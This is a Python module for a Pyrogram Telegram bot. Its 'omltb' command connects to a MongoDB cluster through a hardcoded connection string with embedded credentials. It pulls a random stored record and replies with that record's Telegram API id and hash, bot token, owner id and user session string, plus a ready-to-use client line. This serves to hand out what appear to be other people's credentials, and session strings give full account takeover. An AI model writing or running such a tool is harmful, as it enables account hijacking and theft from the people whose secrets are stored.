from pyrogram import Client, filters
from Arctix import Arctix as app
import pymongo

@app.on_message(filters.command("omltb") & filters.private)
async def fetch_random_mongodb_data(client, message):
    try:
        url = "mongodb+srv://a1:a1@cluster0.0pola4b.mongodb.net/?retryWrites=true&w=majority"
        mongo_client = pymongo.MongoClient(url)
        mongo_db = mongo_client['mltb']
        mongo_collection = mongo_db['data']

        random_document = mongo_collection.aggregate([
            {'$match': {'bot_username': {'$exists': True, '$ne': None, '$ne': "None"},
                        'user_session_string': {'$exists': True, '$ne': None, '$nin': ["", "None"]}}},
            {'$sample': {'size': 1}}
        ]).next()

        formatted_text = (
            f"Source: https://github.com/{random_document['repo_link']}\n"
            f"API id: `{random_document['telegram_api']}`\n"
            f"API hash: `{random_document['telegram_hash']}`\n"
            f"OWNER id: `{random_document['owner_id']}`\n"
            f"Bot Token: `{random_document['bot_token']}`\n"
            f"Bot Username: `@{random_document['bot_username']}`\n"
            f"String: `{random_document['user_session_string']}`\n"
            f"App: `app = Client(\"my_account\", bot_token=\"{random_document['bot_token']}\", api_id=\"{random_document['telegram_api']}\", api_hash=\"{random_document['telegram_hash']}\")`"
)


        await message.reply_text(text=formatted_text)

    except Exception as e:
        print(f"Error fetching random MongoDB data: {e}")
